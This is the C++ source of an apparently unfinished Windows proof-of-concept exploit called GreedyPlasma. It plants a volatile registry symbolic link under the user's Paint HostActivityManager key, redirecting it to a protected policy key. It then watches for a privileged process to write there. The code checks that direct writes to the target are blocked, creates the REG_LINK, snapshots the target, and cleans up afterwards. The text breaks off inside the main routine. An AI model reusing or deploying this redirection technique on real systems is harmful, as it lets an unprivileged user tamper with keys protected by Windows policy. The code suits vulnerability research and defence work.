
// Working in Progress

#define WIN32_NO_STATUS
#include <Windows.h>
#include <winternl.h>
#undef WIN32_NO_STATUS
#include <ntstatus.h>
#include <sddl.h>
#include <conio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef NTSTATUS(WINAPI* PFN_NtDeleteKey)(HANDLE KeyHandle);

static PFN_NtDeleteKey g_NtDeleteKey = NULL;

static const wchar_t GP_REG_LINK_VALUE_NAME[] = L"SymbolicLinkValue";
static const wchar_t GP_PAINT_HAM_SOURCE[] =
    L"Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Paint_8wekyb3d8bbwe!App";
static const wchar_t GP_DEFAULT_TARGET[] = L"Software\\Policies\\Microsoft\\Windows\\CloudContent";
static const wchar_t GP_MIXED_VALUE_NAME[] = L"Mixed";
static const DWORD GP_DEFAULT_OBSERVE_MS = 180000;
static const DWORD GP_DEFAULT_SETTLE_MS = 30000;
static const DWORD GP_MAX_OBSERVE_MS = 600000;
static const DWORD GP_MAX_SETTLE_MS = 300000;
static const DWORD GP_MAX_VALUE_BYTES = 4096;

enum class GpTriggerMode {
    None,
    Manual
};

struct GpRequest {
    const wchar_t* targetSubKey;
    GpTriggerMode triggerMode;
    DWORD observeMs;
    DWORD settleMs;
    bool hold;
};

struct GpTokenEvidence {
    bool queried;
    wchar_t sid[192];
    const wchar_t* integrity;
    DWORD integrityRid;
    bool elevated;
    TOKEN_ELEVATION_TYPE elevationType;
    bool admin;
};

struct GpSourceControl {
    bool keep;
    bool exists;
    bool openWithOpenLinkOption;
    bool isRegLink;
    bool parentCreate;
    DWORD queryError;
    DWORD openLinkError;
    DWORD linkValueError;
    DWORD parentError;
    const wchar_t* reason;
};

struct GpTargetBoundary {
    bool keep;
    bool query;
    bool setValue;
    bool writeDac;
    bool parentQuery;
    bool parentCreate;
    DWORD queryError;
    DWORD setValueError;
    DWORD writeDacError;
    DWORD parentQueryError;
    DWORD parentCreateError;
    const wchar_t* reason;
};

struct GpRegistrySnapshot {
    bool queried;
    DWORD win32Error;
    DWORD valueCount;
    DWORD subKeyCount;
    FILETIME lastWrite;
    ULONGLONG hash;
    bool mixedPresent;
    DWORD mixedType;
    DWORD mixedBytes;
    ULONGLONG mixedHash;
    ULONGLONG mixedQword;
    bool mixedQwordValid;
};

static const wchar_t* TriggerModeName(GpTriggerMode mode)
{
    switch (mode) {
    case GpTriggerMode::None:
        return L"none";
    case GpTriggerMode::Manual:
        return L"manual";
    default:
        return L"unknown";
    }
}

static const wchar_t* ElevationTypeName(TOKEN_ELEVATION_TYPE type)
{
    switch (type) {
    case TokenElevationTypeDefault:
        return L"default";
    case TokenElevationTypeFull:
        return L"full";
    case TokenElevationTypeLimited:
        return L"limited";
    default:
        return L"unknown";
    }
}

static const wchar_t* IntegrityName(DWORD rid)
{
    if (rid >= SECURITY_MANDATORY_SYSTEM_RID) {
        return L"system";
    }
    if (rid >= SECURITY_MANDATORY_HIGH_RID) {
        return L"high";
    }
    if (rid >= SECURITY_MANDATORY_MEDIUM_RID) {
        return L"medium";
    }
    if (rid >= SECURITY_MANDATORY_LOW_RID) {
        return L"low";
    }
    return L"unknown";
}

static void Fnv1a64Update(ULONGLONG* hash, const void* data, SIZE_T bytes)
{
    const BYTE* p = (const BYTE*)data;
    if (!hash || (!data && bytes != 0)) {
        return;
    }
    for (SIZE_T i = 0; i < bytes; ++i) {
        *hash ^= p[i];
        *hash *= 1099511628211ULL;
    }
}

static void Fnv1a64UpdateWide(ULONGLONG* hash, const wchar_t* text)
{
    if (text) {
        Fnv1a64Update(hash, text, wcslen(text) * sizeof(wchar_t));
    }
}

static bool ResolveNativeApis()
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        ntdll = LoadLibraryW(L"ntdll.dll");
    }
    if (!ntdll) {
        wprintf(L"native_api=fail module=ntdll W32=0x%08lx\n", GetLastError());
        return false;
    }

    g_NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
    if (!g_NtDeleteKey) {
        wprintf(L"native_api=fail name=NtDeleteKey W32=0x%08lx\n", GetLastError());
        return false;
    }
    return true;
}

static bool QueryCurrentUserSidString(wchar_t* sidBuffer, SIZE_T sidBufferCount)
{
    HANDLE token = NULL;
    PTOKEN_USER tokenUser = NULL;
    DWORD needed = 0;
    LPWSTR sidString = NULL;
    bool ok = false;

    if (!sidBuffer || sidBufferCount == 0) {
        return false;
    }
    sidBuffer[0] = L'\0';

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        return false;
    }
    GetTokenInformation(token, TokenUser, NULL, 0, &needed);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || needed == 0) {
        goto done;
    }

    tokenUser = (PTOKEN_USER)malloc(needed);
    if (!tokenUser) {
        goto done;
    }
    if (!GetTokenInformation(token, TokenUser, tokenUser, needed, &needed)) {
        goto done;
    }
    if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidString)) {
        goto done;
    }

    wcsncpy_s(sidBuffer, sidBufferCount, sidString, _TRUNCATE);
    ok = true;

done:
    if (sidString) {
        LocalFree(sidString);
    }
    if (tokenUser) {
        free(tokenUser);
    }
    if (token) {
        CloseHandle(token);
    }
    return ok;
}

static bool QueryAdminMembership(HANDLE token)
{
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminSid = NULL;
    BOOL isMember = FALSE;

    if (!AllocateAndInitializeSid(
        &ntAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0,
        0,
        0,
        0,
        0,
        0,
        &adminSid)) {
        return false;
    }

    if (!CheckTokenMembership(token, adminSid, &isMember)) {
        isMember = FALSE;
    }
    FreeSid(adminSid);
    return isMember ? true : false;
}

static GpTokenEvidence CaptureTokenEvidence()
{
    GpTokenEvidence evidence = { 0 };
    HANDLE token = NULL;
    PTOKEN_USER tokenUser = NULL;
    PTOKEN_MANDATORY_LABEL integrity = NULL;
    DWORD needed = 0;
    DWORD returned = 0;
    LPWSTR sidString = NULL;
    TOKEN_ELEVATION elevation = { 0 };
    TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;

    evidence.integrity = L"unknown";

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        wprintf(L"start_token query=0 W32=0x%08lx\n", GetLastError());
        return evidence;
    }

    GetTokenInformation(token, TokenUser, NULL, 0, &needed);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && needed != 0) {
        tokenUser = (PTOKEN_USER)malloc(needed);
        if (tokenUser &&
            GetTokenInformation(token, TokenUser, tokenUser, needed, &returned) &&
            ConvertSidToStringSidW(tokenUser->User.Sid, &sidString)) {
            wcsncpy_s(evidence.sid, ARRAYSIZE(evidence.sid), sidString, _TRUNCATE);
        }
    }

    needed = 0;
    GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &needed);
    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && needed != 0) {
        integrity = (PTOKEN_MANDATORY_LABEL)malloc(needed);
        if (integrity &&
            GetTokenInformation(token, TokenIntegrityLevel, integrity, needed, &returned)) {
            DWORD count = *GetSidSubAuthorityCount(integrity->Label.Sid);
            if (count != 0) {
                evidence.integrityRid = *GetSidSubAuthority(integrity->Label.Sid, count - 1);
                evidence.integrity = IntegrityName(evidence.integrityRid);
            }
        }
    }

    if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &returned)) {
        evidence.elevated = elevation.TokenIsElevated ? true : false;
    }
    if (GetTokenInformation(token, TokenElevationType, &elevationType, sizeof(elevationType), &returned)) {
        evidence.elevationType = elevationType;
    }
    evidence.admin = QueryAdminMembership(token);
    evidence.queried = true;

    wprintf(
        L"start_token user=%ls integrity=%ls rid=0x%08lx elevated=%u elevation_type=%ls admin=%u\n",
        evidence.sid[0] ? evidence.sid : L"<unknown>",
        evidence.integrity,
        evidence.integrityRid,
        evidence.elevated ? 1 : 0,
        ElevationTypeName(evidence.elevationType),
        evidence.admin ? 1 : 0);

    if (sidString) {
        LocalFree(sidString);
    }
    if (integrity) {
        free(integrity);
    }
    if (tokenUser) {
        free(tokenUser);
    }
    if (token) {
        CloseHandle(token);
    }
    return evidence;
}

static bool ReadNextArg(int argc, wchar_t** argv, int* index, const wchar_t* label, const wchar_t** value)
{
    if (!argv || !index || !value || *index + 1 >= argc || !argv[*index + 1] || !argv[*index + 1][0]) {
        wprintf(L"arg=%ls\n", label ? label : L"invalid");
        return false;
    }
    ++(*index);
    *value = argv[*index];
    return true;
}

static bool IsAbsoluteRegistryPath(const wchar_t* path)
{
    if (!path || !path[0]) {
        return true;
    }
    return path[0] == L'\\' ||
        _wcsnicmp(path, L"HKLM\\", 5) == 0 ||
        _wcsnicmp(path, L"HKEY_LOCAL_MACHINE\\", 19) == 0 ||
        _wcsnicmp(path, L"HKCU\\", 5) == 0 ||
        _wcsnicmp(path, L"HKEY_CURRENT_USER\\", 18) == 0 ||
        _wcsnicmp(path, L"HKU\\", 4) == 0 ||
        _wcsnicmp(path, L"HKEY_USERS\\", 11) == 0 ||
        _wcsnicmp(path, L"\\REGISTRY\\", 10) == 0;
}

static bool SplitRegistrySubKey(const wchar_t* subKey, wchar_t* parent, SIZE_T parentCount)
{
    const wchar_t* slash = NULL;
    SIZE_T parentLen = 0;

    if (!subKey || !subKey[0] || !parent || parentCount == 0) {
        return false;
    }

    slash = wcsrchr(subKey, L'\\');
    if (!slash || slash == subKey) {
        return false;
    }

    parentLen = (SIZE_T)(slash - subKey);
    if (parentLen >= parentCount) {
        return false;
    }

    wcsncpy_s(parent, parentCount, subKey, parentLen);
    parent[parentLen] = L'\0';
    return parent[0] != L'\0';
}

static bool BuildNativeTarget(const wchar_t* targetSubKey, wchar_t* nativeTarget, SIZE_T nativeTargetCount)
{
    wchar_t sid[192] = { 0 };

    if (!targetSubKey || !targetSubKey[0] || !nativeTarget || nativeTargetCount == 0) {
        return false;
    }
    if (!QueryCurrentUserSidString(sid, ARRAYSIZE(sid))) {
        return false;
    }

    if (_wcsnicmp(targetSubKey, L"Software\\Classes\\", 17) == 0) {
        return swprintf_s(nativeTarget, nativeTargetCount, L"\\REGISTRY\\USER\\%ls_Classes\\%ls", sid, targetSubKey + 17) >= 0;
    }
    return swprintf_s(nativeTarget, nativeTargetCount, L"\\REGISTRY\\USER\\%ls\\%ls", sid, targetSubKey) >= 0;
}

static bool ProbeRegistryLink(const wchar_t* subKey, bool* openedWithOpenLinkOption, DWORD* openError, DWORD* valueError)
{
    HKEY key = NULL;
    DWORD type = 0;
    DWORD bytes = 0;
    DWORD res = ERROR_SUCCESS;
    bool isLink = false;

    if (openedWithOpenLinkOption) {
        *openedWithOpenLinkOption = false;
    }
    if (openError) {
        *openError = ERROR_SUCCESS;
    }
    if (valueError) {
        *valueError = ERROR_SUCCESS;
    }

    res = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, REG_OPTION_OPEN_LINK, KEY_QUERY_VALUE, &key);
    if (openError) {
        *openError = res;
    }
    if (res != ERROR_SUCCESS) {
        if (valueError) {
            *valueError = res;
        }
        return false;
    }
    if (openedWithOpenLinkOption) {
        *openedWithOpenLinkOption = true;
    }

    res = RegQueryValueExW(key, GP_REG_LINK_VALUE_NAME, NULL, &type, NULL, &bytes);
    if (valueError) {
        *valueError = res;
    }
    if ((res == ERROR_SUCCESS || res == ERROR_MORE_DATA || res == ERROR_INSUFFICIENT_BUFFER) && type == REG_LINK) {
        isLink = true;
    }
    RegCloseKey(key);
    return isLink;
}

static bool DeleteRegistryLinkBySubKey(const wchar_t* subKey, const wchar_t* reason)
{
    HKEY key = NULL;
    DWORD res = ERROR_SUCCESS;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    if (!g_NtDeleteKey) {
        wprintf(L"reg_link_delete=fail reason=%ls target=%ls NT=0x%08lx\n", reason ? reason : L"<none>", subKey, status);
        return false;
    }

    res = RegOpenKeyExW(HKEY_CURRENT_USER, subKey, REG_OPTION_OPEN_LINK, DELETE, &key);
    if (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND) {
        return true;
    }
    if (res != ERROR_SUCCESS) {
        wprintf(L"reg_link_delete=fail reason=%ls target=%ls W32=0x%08lx\n", reason ? reason : L"<none>", subKey, res);
        return false;
    }

    status = g_NtDeleteKey(key);
    RegCloseKey(key);
    wprintf(
        L"reg_link_delete=%ls reason=%ls target=%ls NT=0x%08lx\n",
        NT_SUCCESS(status) ? L"ok" : L"fail",
        reason ? reason : L"<none>",
        subKey,
        status);
    return NT_SUCCESS(status);
}

static GpTargetBoundary CheckTargetBoundary(const wchar_t* targetSubKey)
{
    GpTargetBoundary boundary = { 0 };
    HKEY key = NULL;
    wchar_t parent[512] = { 0 };

    boundary.queryError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_READ, &key);
    boundary.query = boundary.queryError == ERROR_SUCCESS;
    if (key) {
        RegCloseKey(key);
        key = NULL;
    }

    boundary.setValueError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_SET_VALUE, &key);
    boundary.setValue = boundary.setValueError == ERROR_SUCCESS;
    if (key) {
        RegCloseKey(key);
        key = NULL;
    }

    boundary.writeDacError = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, WRITE_DAC, &key);
    boundary.writeDac = boundary.writeDacError == ERROR_SUCCESS;
    if (key) {
        RegCloseKey(key);
        key = NULL;
    }

    boundary.parentQueryError = ERROR_INVALID_PARAMETER;
    boundary.parentCreateError = ERROR_INVALID_PARAMETER;
    if (SplitRegistrySubKey(targetSubKey, parent, ARRAYSIZE(parent))) {
        boundary.parentQueryError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_READ, &key);
        boundary.parentQuery = boundary.parentQueryError == ERROR_SUCCESS;
        if (key) {
            RegCloseKey(key);
            key = NULL;
        }
        boundary.parentCreateError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_CREATE_SUB_KEY, &key);
        boundary.parentCreate = boundary.parentCreateError == ERROR_SUCCESS;
        if (key) {
            RegCloseKey(key);
            key = NULL;
        }
    }

    boundary.keep =
        boundary.query &&
        !boundary.setValue &&
        boundary.setValueError == ERROR_ACCESS_DENIED &&
        !boundary.writeDac &&
        boundary.writeDacError == ERROR_ACCESS_DENIED &&
        boundary.parentQuery &&
        !boundary.parentCreate &&
        boundary.parentCreateError == ERROR_ACCESS_DENIED;

    boundary.reason = boundary.keep ? L"direct-write-blocked" :
        (boundary.setValue ? L"direct-user-writable" :
            (!boundary.query ? L"target-query-failed" :
                (!boundary.parentQuery ? L"target-parent-query-failed" :
                    (boundary.parentCreate ? L"target-parent-creatable" : L"target-boundary-failed"))));

    wprintf(
        L"target_boundary target=%ls query=%u set_value=%u write_dac=%u parent_query=%u parent_create=%u qerr=0x%08lx seterr=0x%08lx dacerr=0x%08lx parent_qerr=0x%08lx parent_createerr=0x%08lx result=%ls reason=%ls\n",
        targetSubKey,
        boundary.query ? 1 : 0,
        boundary.setValue ? 1 : 0,
        boundary.writeDac ? 1 : 0,
        boundary.parentQuery ? 1 : 0,
        boundary.parentCreate ? 1 : 0,
        boundary.queryError,
        boundary.setValueError,
        boundary.writeDacError,
        boundary.parentQueryError,
        boundary.parentCreateError,
        boundary.keep ? L"keep" : L"reject",
        boundary.reason);
    return boundary;
}

static GpSourceControl CheckSourceControl()
{
    GpSourceControl control = { 0 };
    HKEY key = NULL;
    HKEY parentKey = NULL;
    wchar_t parent[512] = { 0 };

    control.queryError = RegOpenKeyExW(HKEY_CURRENT_USER, GP_PAINT_HAM_SOURCE, 0, KEY_READ, &key);
    control.exists = control.queryError == ERROR_SUCCESS;
    if (key) {
        RegCloseKey(key);
        key = NULL;
    }

    control.isRegLink = ProbeRegistryLink(
        GP_PAINT_HAM_SOURCE,
        &control.openWithOpenLinkOption,
        &control.openLinkError,
        &control.linkValueError);

    if (control.exists && !control.isRegLink) {
        control.reason = L"source-existing-normal-key";
        goto print;
    }
    if (control.isRegLink) {
        control.keep = true;
        control.reason = L"source-existing-reg-link";
        goto print;
    }
    if (control.queryError != ERROR_FILE_NOT_FOUND && control.queryError != ERROR_PATH_NOT_FOUND) {
        control.reason = L"source-query-failed";
        goto print;
    }

    if (!SplitRegistrySubKey(GP_PAINT_HAM_SOURCE, parent, ARRAYSIZE(parent))) {
        control.parentError = ERROR_INVALID_PARAMETER;
        control.reason = L"source-parent-invalid";
        goto print;
    }

    control.parentError = RegOpenKeyExW(HKEY_CURRENT_USER, parent, 0, KEY_READ | KEY_CREATE_SUB_KEY, &parentKey);
    control.parentCreate = control.parentError == ERROR_SUCCESS;
    if (parentKey) {
        RegCloseKey(parentKey);
        parentKey = NULL;
    }
    if (control.parentCreate) {
        control.keep = true;
        control.reason = L"source-missing";
    }
    else if (control.parentError == ERROR_FILE_NOT_FOUND || control.parentError == ERROR_PATH_NOT_FOUND) {
        control.reason = L"source-parent-missing";
    }
    else if (control.parentError == ERROR_ACCESS_DENIED) {
        control.reason = L"source-parent-not-creatable";
    }
    else {
        control.reason = L"source-parent-open-failed";
    }

print:
    if (!control.reason) {
        control.reason = L"source-control-failed";
    }
    wprintf(
        L"source_control source=%ls exists=%u open_with_open_link_option=%u is_reg_link=%u parent_create=%u result=%ls reason=%ls qerr=0x%08lx link_openerr=0x%08lx link_valueerr=0x%08lx parenterr=0x%08lx\n",
        GP_PAINT_HAM_SOURCE,
        control.exists ? 1 : 0,
        control.openWithOpenLinkOption ? 1 : 0,
        control.isRegLink ? 1 : 0,
        control.parentCreate ? 1 : 0,
        control.keep ? L"keep" : L"reject",
        control.reason,
        control.queryError,
        control.openLinkError,
        control.linkValueError,
        control.parentError);
    return control;
}

static bool CaptureSnapshot(const wchar_t* targetSubKey, const wchar_t* phase, GpRegistrySnapshot* snapshot)
{
    HKEY key = NULL;
    DWORD res = ERROR_SUCCESS;
    DWORD subKeys = 0;
    DWORD values = 0;
    FILETIME lastWrite = { 0 };
    ULONGLONG hash = 14695981039346656037ULL;

    if (!snapshot) {
        return false;
    }
    ZeroMemory(snapshot, sizeof(*snapshot));
    snapshot->hash = hash;

    res = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_READ, &key);
    if (res != ERROR_SUCCESS) {
        snapshot->win32Error = res;
        wprintf(
            L"target_registry_snapshot phase=%ls target=%ls query=0 values=0 subkeys=0 mixed_present=0 mixed_type=0 mixed_qword_valid=0 hash=0x%016llx W32=0x%08lx\n",
            phase ? phase : L"<none>",
            targetSubKey,
            (unsigned long long)snapshot->hash,
            res);
        return false;
    }

    snapshot->queried = true;
    res = RegQueryInfoKeyW(key, NULL, NULL, NULL, &subKeys, NULL, NULL, &values, NULL, NULL, NULL, &lastWrite);
    if (res != ERROR_SUCCESS) {
        snapshot->win32Error = res;
        RegCloseKey(key);
        return false;
    }

    snapshot->valueCount = values;
    snapshot->subKeyCount = subKeys;
    snapshot->lastWrite = lastWrite;

    Fnv1a64UpdateWide(&hash, targetSubKey);
    Fnv1a64Update(&hash, &subKeys, sizeof(subKeys));
    Fnv1a64Update(&hash, &values, sizeof(values));
    Fnv1a64Update(&hash, &lastWrite, sizeof(lastWrite));

    for (DWORD i = 0; i < values; ++i) {
        wchar_t valueName[512] = { 0 };
        BYTE data[GP_MAX_VALUE_BYTES] = { 0 };
        DWORD valueNameChars = ARRAYSIZE(valueName);
        DWORD type = 0;
        DWORD dataBytes = sizeof(data);
        DWORD enumRes = RegEnumValueW(key, i, valueName, &valueNameChars, NULL, &type, data, &dataBytes);

        if (enumRes == ERROR_MORE_DATA) {
            dataBytes = 0;
        }
        else if (enumRes != ERROR_SUCCESS) {
            continue;
        }

        Fnv1a64UpdateWide(&hash, valueName);
        Fnv1a64Update(&hash, &type, sizeof(type));
        Fnv1a64Update(&hash, &dataBytes, sizeof(dataBytes));
        Fnv1a64Update(&hash, data, dataBytes);

        if (_wcsicmp(valueName, GP_MIXED_VALUE_NAME) == 0) {
            snapshot->mixedPresent = true;
            snapshot->mixedType = type;
            snapshot->mixedBytes = dataBytes;
            snapshot->mixedHash = 14695981039346656037ULL;
            Fnv1a64Update(&snapshot->mixedHash, data, dataBytes);
            if (type == REG_QWORD && dataBytes >= sizeof(ULONGLONG)) {
                memcpy(&snapshot->mixedQword, data, sizeof(snapshot->mixedQword));
                snapshot->mixedQwordValid = true;
            }
        }
    }

    snapshot->hash = hash;
    snapshot->win32Error = ERROR_SUCCESS;
    RegCloseKey(key);

    wprintf(
        L"target_registry_snapshot phase=%ls target=%ls query=1 values=%lu subkeys=%lu mixed_present=%u mixed_type=%lu mixed_bytes=%lu mixed_qword_valid=%u mixed_qword=0x%016llx mixed_hash=0x%016llx hash=0x%016llx W32=0x%08lx\n",
        phase ? phase : L"<none>",
        targetSubKey,
        snapshot->valueCount,
        snapshot->subKeyCount,
        snapshot->mixedPresent ? 1 : 0,
        snapshot->mixedType,
        snapshot->mixedBytes,
        snapshot->mixedQwordValid ? 1 : 0,
        (unsigned long long)snapshot->mixedQword,
        (unsigned long long)snapshot->mixedHash,
        (unsigned long long)snapshot->hash,
        snapshot->win32Error);
    return true;
}

static bool StageRegistryLink(const wchar_t* targetSubKey, wchar_t* nativeTarget, SIZE_T nativeTargetCount)
{
    HKEY key = NULL;
    DWORD disposition = 0;
    DWORD res = ERROR_SUCCESS;
    bool openedWithOpenLinkOption = false;
    bool isLink = false;
    DWORD openError = ERROR_SUCCESS;
    DWORD valueError = ERROR_SUCCESS;

    isLink = ProbeRegistryLink(GP_PAINT_HAM_SOURCE, &openedWithOpenLinkOption, &openError, &valueError);
    if (isLink && !DeleteRegistryLinkBySubKey(GP_PAINT_HAM_SOURCE, L"stale-pre-stage")) {
        wprintf(L"reg_link_stage=fail reason=stale-link-delete-failed source=%ls\n", GP_PAINT_HAM_SOURCE);
        return false;
    }

    if (!BuildNativeTarget(targetSubKey, nativeTarget, nativeTargetCount)) {
        wprintf(L"reg_link_stage=fail reason=native-target-build-failed source=%ls target=%ls\n", GP_PAINT_HAM_SOURCE, targetSubKey);
        return false;
    }

    res = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        GP_PAINT_HAM_SOURCE,
        0,
        NULL,
        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &key,
        &disposition);
    if (res != ERROR_SUCCESS) {
        wprintf(L"reg_link_stage=fail source=%ls W32=0x%08lx\n", GP_PAINT_HAM_SOURCE, res);
        return false;
    }

    res = RegSetValueExW(
        key,
        GP_REG_LINK_VALUE_NAME,
        0,
        REG_LINK,
        (const BYTE*)nativeTarget,
        (DWORD)(wcslen(nativeTarget) * sizeof(wchar_t)));
    if (res != ERROR_SUCCESS) {
        wprintf(L"reg_link_stage=fail source=%ls value=%ls W32=0x%08lx\n", GP_PAINT_HAM_SOURCE, GP_REG_LINK_VALUE_NAME, res);
        if (g_NtDeleteKey) {
            (void)g_NtDeleteKey(key);
        }
        RegCloseKey(key);
        return false;
    }

    RegFlushKey(key);
    RegCloseKey(key);
    wprintf(L"reglink target=%ls\n", nativeTarget);
    wprintf(L"reg_link_stage=ok source=%ls target=%ls created=%u\n", GP_PAINT_HAM_SOURCE, nativeTarget, disposition == REG_CREATED_NEW_KEY ? 1 : 0);
    return true;
}

static bool CleanupRegistryLink()
{
    HKEY key = NULL;
    bool deleted = DeleteRegistryLinkBySubKey(GP_PAINT_HAM_SOURCE, L"run-cleanup");
    DWORD res = RegOpenKeyExW(HKEY_CURRENT_USER, GP_PAINT_HAM_SOURCE, 0, KEY_READ, &key);
    if (key) {
        RegCloseKey(key);
    }

    wprintf(
        L"rollback_verified=%u source=%ls W32=0x%08lx\n",
        (deleted && (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND)) ? 1 : 0,
        GP_PAINT_HAM_SOURCE,
        res);
    return deleted && (res == ERROR_FILE_NOT_FOUND || res == ERROR_PATH_NOT_FOUND);
}

static bool ParseTriggerMode(const wchar_t* value, GpTriggerMode* mode)
{
    if (!value || !mode) {
        return false;
    }
    if (_wcsicmp(value, L"none") == 0) {
        *mode = GpTriggerMode::None;
        return true;
    }
    if (_wcsicmp(value, L"manual") == 0) {
        *mode = GpTriggerMode::Manual;
        return true;
    }
    return false;
}

static void PrintUsage()
{
    wprintf(L"usage=GreedyPlasma.exe [--paint-ham-poc] [--reg-target <HKCU-relative-target>] [--trigger-mode none|manual] [--observe-ms <ms>] [--settle-ms <ms>] [--hold|--no-hold]\n");
    wprintf(L"default_source=\"%ls\"\n", GP_PAINT_HAM_SOURCE);
    wprintf(L"default_target=\"%ls\"\n", GP_DEFAULT_TARGET);
    wprintf(L"default_trigger=manual default_observe_ms=%lu default_settle_ms=%lu\n", GP_DEFAULT_OBSERVE_MS, GP_DEFAULT_SETTLE_MS);
}

static bool ParseOptions(int argc, wchar_t** argv, GpRequest* request)
{
    if (!request) {
        return false;
    }

    request->targetSubKey = GP_DEFAULT_TARGET;
    request->triggerMode = GpTriggerMode::Manual;
    request->observeMs = GP_DEFAULT_OBSERVE_MS;
    request->settleMs = GP_DEFAULT_SETTLE_MS;
    request->hold = true;

    for (int i = 1; i < argc; ++i) {
        const wchar_t* arg = argv[i];
        const wchar_t* value = NULL;

        if (!arg || !arg[0]) {
            continue;
        }
        if (wcscmp(arg, L"--paint-ham-poc") == 0) {
            continue;
        }
        if (wcscmp(arg, L"--help") == 0 || wcscmp(arg, L"-h") == 0 || wcscmp(arg, L"/?") == 0) {
            PrintUsage();
            return false;
        }
        if (wcscmp(arg, L"--reg-source") == 0) {
            wprintf(L"arg=unsupported value=--reg-source reason=source-is-confirmed-and-fixed\n");
            return false;
        }
        if (wcscmp(arg, L"--reg-target") == 0) {
            if (!ReadNextArg(argc, argv, &i, L"invalid-reg-target", &value)) {
                return false;
            }
            request->targetSubKey = value;
            continue;
        }
        if (wcscmp(arg, L"--trigger-mode") == 0) {
            if (!ReadNextArg(argc, argv, &i, L"invalid-trigger-mode", &value)) {
                return false;
            }
            if (!ParseTriggerMode(value, &request->triggerMode)) {
                wprintf(L"arg=invalid-trigger-mode value=%ls allowed=none|manual\n", value);
                return false;
            }
            continue;
        }
        if (wcscmp(arg, L"--observe-ms") == 0) {
            wchar_t* end = NULL;
            unsigned long parsed = 0;
            if (!ReadNextArg(argc, argv, &i, L"invalid-observe-ms", &value)) {
                return false;
            }
            parsed = wcstoul(value, &end, 10);
            if (end == value || !end || *end != L'\0' || parsed == 0 || parsed > GP_MAX_OBSERVE_MS) {
                wprintf(L"arg=invalid-observe-ms value=%ls max=%lu\n", value, GP_MAX_OBSERVE_MS);
                return false;
            }
            request->observeMs = parsed;
            continue;
        }
        if (wcscmp(arg, L"--settle-ms") == 0) {
            wchar_t* end = NULL;
            unsigned long parsed = 0;
            if (!ReadNextArg(argc, argv, &i, L"invalid-settle-ms", &value)) {
                return false;
            }
            parsed = wcstoul(value, &end, 10);
            if (end == value || !end || *end != L'\0' || parsed > GP_MAX_SETTLE_MS) {
                wprintf(L"arg=invalid-settle-ms value=%ls max=%lu\n", value, GP_MAX_SETTLE_MS);
                return false;
            }
            request->settleMs = parsed;
            continue;
        }
        if (wcscmp(arg, L"--hold") == 0) {
            request->hold = true;
            continue;
        }
        if (wcscmp(arg, L"--no-hold") == 0) {
            request->hold = false;
            continue;
        }

        wprintf(L"arg=unknown value=%ls\n", arg);
        return false;
    }

    if (IsAbsoluteRegistryPath(request->targetSubKey)) {
        wprintf(L"arg=invalid-reg-target reason=hkcu-relative-required value=%ls\n", request->targetSubKey ? request->targetSubKey : L"<null>");
        return false;
    }
    return true;
}

static bool ArmTargetNotify(const wchar_t* targetSubKey, HKEY* notifyKey, HANDLE* notifyEvent, DWORD* notifyError)
{
    DWORD res = ERROR_SUCCESS;

    if (notifyKey) {
        *notifyKey = NULL;
    }
    if (notifyEvent) {
        *notifyEvent = NULL;
    }
    if (notifyError) {
        *notifyError = ERROR_SUCCESS;
    }

    res = RegOpenKeyExW(HKEY_CURRENT_USER, targetSubKey, 0, KEY_NOTIFY | KEY_READ, notifyKey);
    if (res != ERROR_SUCCESS) {
        if (notifyError) {
            *notifyError = res;
        }
        return false;
    }

    *notifyEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!*notifyEvent) {
        res = GetLastError();
        RegCloseKey(*notifyKey);
        *notifyKey = NULL;
        if (notifyError) {
            *notifyError = res;
        }
        return false;
    }

    res = RegNotifyChangeKeyValue(
        *notifyKey,
        TRUE,
        REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_SECURITY,
        *notifyEvent,
        TRUE);
    if (notifyError) {
        *notifyError = res;
    }
    if (res != ERROR_SUCCESS) {
        CloseHandle(*notifyEvent);
        *notifyEvent = NULL;
        RegCloseKey(*notifyKey);
        *notifyKey = NULL;
        return false;
    }
    return true;
}

static int RunPaintHamPoc(int argc, wchar_t** argv)
{
    GpRequest request = { 0 };
    GpTargetBoundary boundary = { 0 };
    GpSourceControl source = { 0 };
    GpRegistrySnapshot before = { 0 };
    GpRegistrySnapshot after = { 0 };
    wchar_t nativeTarget[1024] = { 0 };
    HKEY notifyKey = NULL;
    HANDLE notifyEvent = NULL;
